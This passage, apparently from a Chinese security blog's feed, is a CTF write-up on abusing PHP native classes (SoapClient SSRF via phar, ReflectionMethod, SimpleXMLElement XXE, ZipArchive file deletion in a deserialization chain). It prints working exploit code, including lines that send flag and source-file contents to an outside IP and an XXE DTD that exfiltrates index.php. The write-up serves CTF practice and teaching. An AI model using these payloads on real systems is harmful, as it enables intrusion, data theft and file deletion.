src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665421499752-266b58e3-9414-4291-b9c6-c3b67e187013.png" alt="img"><br>这里只允许本地访问，我们要进行ssrf<br>构造exp:</p><pre><code class="php">&lt;?phpclass File&#123;    public $file_name;    public $func = &quot;SoapClient&quot;;    function __construct($file_name)&#123;        $this-&gt;file_name = $file_name;    &#125;&#125;$target = &#39;http://127.0.0.1/admin.php&#39;;$post_string = &#39;admin=1&amp;cmd=curl &quot;http://108.166.201.16:888&quot;.&quot;?`/readflag`&quot;&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\r\n&quot;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,);$f = [null, array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;urldecode(str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string)),&#39;uri&#39;=&gt; &quot;user&quot;)];@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt; __HALT_COMPILER();&lt;/script&gt;&#39;); //设置stub$o = new File($f);$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>详细过程可查看:<a href="https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c#">https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c?#</a> 《web刷题》</p><h1 id="利用ReflectionMethod读取User类的方法"><a href="#利用ReflectionMethod读取User类的方法" class="headerlink" title="利用ReflectionMethod读取User类的方法"></a>利用ReflectionMethod读取User类的方法</h1><h2 id="ReflectionMethod类"><a href="#ReflectionMethod类" class="headerlink" title="ReflectionMethod类"></a>ReflectionMethod类</h2><p>ReflectionMethod的类报告了方法的相关信息<br>版本：(PHP 5, PHP 7, PHP 8)</p><h3 id="ReflectionClass-API"><a href="#ReflectionClass-API" class="headerlink" title="ReflectionClass API"></a>ReflectionClass API</h3><pre><code class="php">$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回nullvar_dump($ref-&gt;inNamespace()); // 是否在命名空间中var_dump($ref-&gt;getConstants()); // 获取所有定义的常量var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回falsevar_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间var_dump($ref-&gt;getStartLine()); // 获取起始行号print_r($ref-&gt;getStaticProperties()); // 获取静态属性print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // 检查方法是否已经定义var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制var_dump($ref-&gt;isFinal()); // 检查类是否声明为 finalvar_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化var_dump($ref-&gt;isInterface()); // 检查类是否是一个接口（interface）var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类var_dump($ref-&gt;isTrait()); // 返回了是否为一个 traitvar_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。var_dump($ref-&gt;newInstance());// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。//这个参数以 array 形式传递到类的构造函数。var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。</code></pre><pre><code>### ReflectionMethod API```php/*ReflectionMethod::__construct — ReflectionMethod 的构造函数ReflectionMethod::export — 输出一个回调方法ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例ReflectionMethod::getModifiers — 获取方法的修饰符ReflectionMethod::getPrototype — 返回方法原型 (如果存在)ReflectionMethod::invoke — InvokeReflectionMethod::invokeArgs — 带参数执行ReflectionMethod::isAbstract — 判断方法是否是抽象方法ReflectionMethod::isConstructor — 判断方法是否是构造方法ReflectionMethod::isDestructor — 判断方法是否是析构方法ReflectionMethod::isFinal — 判断方法是否定义 finalReflectionMethod::isPrivate — 判断方法是否是私有方法ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)ReflectionMethod::isPublic — 判断方法是否是公开方法ReflectionMethod::isStatic — 判断方法是否是静态方法ReflectionMethod::setAccessible — 设置方法是否访问ReflectionMethod::__toString — 返回反射方法对象的字符串表达*/ReflectionMethod extends ReflectionFunctionAbstract implements Reflector &#123;/* 常量 */const integer IS_STATIC = 1 ;const integer IS_PUBLIC = 256 ;const integer IS_PROTECTED = 512 ;const integer IS_PRIVATE = 1024 ;const integer IS_ABSTRACT = 2 ;const integer IS_FINAL = 4 ;/* 属性 */public $name ;public $class ;/* 方法 */public __construct ( mixed $class , string $name )public static export ( string $class , string $name [, bool $return = false ] ) : stringpublic getClosure ( object $object ) : Closurepublic getDeclaringClass ( ) : ReflectionClasspublic getModifiers ( ) : intpublic getPrototype ( ) : ReflectionMethodpublic invoke ( object $object [, mixed $parameter [, mixed $... ]] ) : mixedpublic invokeArgs ( object $object , array $args ) : mixedpublic isAbstract ( ) : boolpublic isConstructor ( ) : boolpublic isDestructor ( ) : boolpublic isFinal ( ) : boolpublic isPrivate ( ) : boolpublic isProtected ( ) : boolpublic isPublic ( ) : boolpublic isStatic ( ) : boolpublic setAccessible ( bool $accessible ) : voidpublic __toString ( ) : string/* 继承的方法 */final private ReflectionFunctionAbstract::__clone ( ) : voidpublic ReflectionFunctionAbstract::getClosureScopeClass ( ) : ReflectionClasspublic ReflectionFunctionAbstract::getClosureThis ( ) : objectpublic ReflectionFunctionAbstract::getDocComment ( ) : stringpublic ReflectionFunctionAbstract::getEndLine ( ) : intpublic ReflectionFunctionAbstract::getExtension ( ) : ReflectionExtensionpublic ReflectionFunctionAbstract::getExtensionName ( ) : stringpublic ReflectionFunctionAbstract::getFileName ( ) : stringpublic ReflectionFunctionAbstract::getName ( ) : stringpublic ReflectionFunctionAbstract::getNamespaceName ( ) : stringpublic ReflectionFunctionAbstract::getNumberOfParameters ( ) : intpublic ReflectionFunctionAbstract::getNumberOfRequiredParameters ( ) : intpublic ReflectionFunctionAbstract::getParameters ( ) : arraypublic ReflectionFunctionAbstract::getReturnType ( ) : ReflectionTypepublic ReflectionFunctionAbstract::getShortName ( ) : stringpublic ReflectionFunctionAbstract::getStartLine ( ) : intpublic ReflectionFunctionAbstract::getStaticVariables ( ) : arraypublic ReflectionFunctionAbstract::hasReturnType ( ) : boolpublic ReflectionFunctionAbstract::inNamespace ( ) : boolpublic ReflectionFunctionAbstract::isClosure ( ) : boolpublic ReflectionFunctionAbstract::isDeprecated ( ) : boolpublic ReflectionFunctionAbstract::isGenerator ( ) : boolpublic ReflectionFunctionAbstract::isInternal ( ) : boolpublic ReflectionFunctionAbstract::isUserDefined ( ) : boolpublic ReflectionFunctionAbstract::isVariadic ( ) : boolpublic ReflectionFunctionAbstract::returnsReference ( ) : boolabstract public ReflectionFunctionAbstract::__toString ( ) : void&#125;</code></pre><h2 id="第十四届全国信息安全竞赛-easy-resource"><a href="#第十四届全国信息安全竞赛-easy-resource" class="headerlink" title="[第十四届全国信息安全竞赛]easy_resource"></a>[第十四届全国信息安全竞赛]easy_resource</h2><p><strong>目录扫描可获得源码:</strong></p><pre><code class="php">&lt;?phpclass User&#123;    private static $c = 0;    function a()    &#123;        return ++self::$c;    &#125;    function b()    &#123;        return ++self::$c;    &#125;    function c()    &#123;        return ++self::$c;    &#125;    function d()    &#123;        return ++self::$c;    &#125;    function e()    &#123;        return ++self::$c;    &#125;    function f()    &#123;        return ++self::$c;    &#125;    function g()    &#123;        return ++self::$c;    &#125;    function h()    &#123;        return ++self::$c;    &#125;    function i()    &#123;        return ++self::$c;    &#125;    function j()    &#123;        return ++self::$c;    &#125;    function k()    &#123;        return ++self::$c;    &#125;    function l()    &#123;        return ++self::$c;    &#125;    function m()    &#123;        return ++self::$c;    &#125;    function n()    &#123;        return ++self::$c;    &#125;    function o()    &#123;        return ++self::$c;    &#125;    function p()    &#123;        return ++self::$c;    &#125;    function q()    &#123;        return ++self::$c;    &#125;    function r()    &#123;        return ++self::$c;    &#125;    function s()    &#123;        return ++self::$c;    &#125;    function t()    &#123;        return ++self::$c;    &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd());</code></pre><p>可利用原生的反射类进行读取，题目说在看不到的地方，猜测是在注释的地方<br>可构造payload:</p><pre><code class="php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></pre><p>翻译一下就是:</p><pre><code class="php">$method = new ReflectionMethod(User,a);var_dump($method-&gt;getDocComment); //getDocComment获取文档注释</code></pre><p>由于不知道是在哪个方法内，所以可以进行遍历<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665485044657-d5e28374-5468-4f38-a96b-d076e14ca3f9.png" alt="img"></p><h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><p> SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。  </p><h2 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h2><p> 官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487834374-89b18cf7-62f3-4f6d-8772-86dcad3bdbbd.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487841658-6b4bb837-d7b0-40a2-8dd4-58841f416edb.png" alt="img"><br>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。<br>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p><h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>随便注册一个账户发现如下源码<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933717474-8039a055-da9e-450d-b80a-9cf05791eb7f.png" alt="img"></p><pre><code class="php">&lt;?php class calc&#123;    function __construct__()&#123;        calc();    &#125;    function calc($args1,$method,$args2)&#123;        $args1=intval($args1);        $args2=intval($args2);        switch ($method) &#123;            case &#39;a&#39;:                $method=&quot;+&quot;;                break;            case &#39;b&#39;:                $method=&quot;-&quot;;                break;            case &#39;c&#39;:                $method=&quot;*&quot;;                break;            case &#39;d&#39;:                $method=&quot;/&quot;;                break;                        default:                die(&quot;invalid input&quot;);        &#125;        $Expression=$args1.$method.$args2;        eval(&quot;\$r=$Expression;&quot;);        die(&quot;Calculation results:&quot;.$r);    &#125;&#125;?&gt;        </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933869850-f292420e-807a-4315-9ae4-97d12651944b.png" alt="img"><br>我们可以利用SimpleXMLElement类<br>我们构造的xml如下:<br>test.xml</p><pre><code class="php">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM &quot;http://108.166.201.16:8000/evil.dtd&quot;&gt;%int;%all;%send;]&gt;</code></pre><p>evil.dtd</p><pre><code class="php">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://108.166.201.16:5555/?%payl;&#39;&gt;&quot;&gt;</code></pre><p>在vps上放上这两个文件<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934117600-563713ba-7b9f-40ba-9e24-4b49b463c64a.png" alt="img"><br>然后再使用vps监听5555端口<br>最终构造payload</p><pre><code class="php">http://16c35a6e-0285-4dc1-9c3d-2acf598489fc.node4.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://108.166.201.16:8000/test.xml&amp;args[]=2&amp;args[]=true</code></pre><p>我们可以看到接受到了数据，base64解码即可<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934164637-826456e2-a39d-499b-96c6-528cbaa8a0f9.png" alt="img"><br>同理可获得其他页面源码</p><h1 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h1><h2 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h2><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。<br>下面列举几个常见的类方法：</p><ul><li><a href="https://www.php.net/manual/zh/ziparchive.addemptydir.php">ZipArchive::addEmptyDir</a>：添加一个新的文件目录</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfile.php">ZipArchive::addFile</a>：将文件添加到指定zip压缩包中</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfromstring.php">ZipArchive::addFromString</a>：添加新的文件同时将内容添加进去</li><li><a href="https://www.php.net/manual/zh/ziparchive.close.php">ZipArchive::close</a>：关闭ziparchive</li><li><a href="https://www.php.net/manual/zh/ziparchive.extractto.php">ZipArchive::extractTo</a>：将压缩包解压</li><li><a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>：打开一个zip压缩包</li><li><a href="https://www.php.net/manual/zh/ziparchive.deleteindex.php">ZipArchive::deleteIndex</a>：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件</li><li><a href="https://www.php.net/manual/zh/ziparchive.deletename.php">ZipArchive::deleteName</a>：删除压缩包中的某一个文件名称，同时也将文件删除</li><li>……</li></ul><p>我们来重点看看 ZipArchive::open 方法：</p><pre><code class="php">ZipArchive::open(string $filename, int $flags=0)</code></pre><p>该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</p><ul><li>filename：要打开的ZIP存档的文件名。</li><li>flags：用于打开档案的模式。有以下几种模式： <ul><li>ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li><li>ZipArchive::CREATE：如果不存在则创建一个zip压缩包。</li><li>ZipArchive::RDONLY：只读模式打开压缩包。</li><li>ZipArchive::EXCL：如果压缩包已经存在，则出错。</li><li>ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。</li></ul></li></ul><p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。<br>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。下面我们来看一道CTF题目。</p><h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><p>源码下载:<a href="https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip">https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip</a></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#39;shell.php&#39;);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;        public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;class login&#123;    public $file;    public $filename;    public $content;    public function __construct($file,$filename,$content)    &#123;        $this-&gt;file=$file;        $this-&gt;filename=$filename;        $this-&gt;content=$content;    &#125;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);            die(&#39;login success you can to open shell file!&#39;);        &#125;    &#125;&#125;class register&#123;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            die(&#39;success register admin&#39;);        &#125;else&#123;            die(&#39;please register admin &#39;);        &#125;    &#125;&#125;class Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#39;waf.txt&#39;))&#123;            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);        &#125;    &#125;&#125;if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;])))&#123;    @unserialize(base64_decode($_POST[&#39;unser&#39;]));&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010658741-eba5b190-5be1-4994-982d-2c2109ed09eb.png" alt="img"><br>这里反序列化前有个校验，直接使用数组绕过</p><pre><code class="php">http://127.0.0.1/test/?a[]=1&amp;b[]=2</code></pre><p>读取下shell.php的内容<br>构造payload:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;whoami&#39;;$a-&gt;filename = &#39;php://filter/read=convert.base64-encode/resource=shell&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>解码得到shell.php的源码:</p><pre><code class="php">&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#39;so long!&#39;);     &#125;&#125;</code></pre><p>shell.php可以执行系统命令<br>但是如果要执行shell.php<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010871391-7c2b5910-4f40-4616-8ff1-6e6309df9a70.png" alt="img"><br>必须不存在这个文件，那么我们就要想办法把它删除<br>我们必须要使用原生类，这个原生类还必须是open方法可以删除文件<br>遍历一下:</p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;open&#39;        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011335328-c952daa5-ae18-4e62-9460-028443cb42c0.png" alt="img"><br>ZipArchive刚好有个open方法可以满足,上文已经介绍过了<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011423047-bc1ad514-77ec-4e4b-b46b-633575e9e46f.png" alt="img"><br>传入8相当于重写文件<br>最终构造poc:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = 8;$a-&gt;filename = &#39;waf.txt&#39;;$a-&gt;file = new ZipArchive();echo base64_encode(serialize($a));</code></pre><pre><code class="php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=</code></pre><p>传入后waf.txt就被删除，我这里是本地搭建的环境所以直接可以看到<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012203141-9ea79c5d-767c-451e-8f16-60826fb1108f.png" alt="img"><br>接下来构造poc执行命令即可:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;type flag&#39;;$a-&gt;filename = &#39;111&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>我这里是用windows系统复现的，所以使用命令不同，思路都一样<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012717080-da919474-bae9-47a8-978b-cd5b2e4b94a1.png" alt="img"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/rawrecruit/article/details/123968687">https://blog.csdn.net/rawrecruit/article/details/123968687</a><br><a href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a><br><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;查看各方法内置类&quot;&gt;&lt;a href=&quot;#查看各方法内置类&quot; class=&quot;headerlink&quot; title=&quot;查看各方法内置类&quot;&gt;&lt;/a&gt;查看各方法内置类&lt;/h1&gt;&lt;p&gt; 通过这段代码查看方法的类，这里看到__toString方法对应的Error类  &lt;/p&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="php" scheme="https://sakurahack-y.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>内网学习篇</title>
    <link href="https://sakurahack-y.github.io/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/"/>
    <id>https://sakurahack-y.github.io/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/</id>
    <published>2022-07-13T06:56:01.000Z</published>
    <updated>2022-07-14T00:55:13.117Z</updated>
    
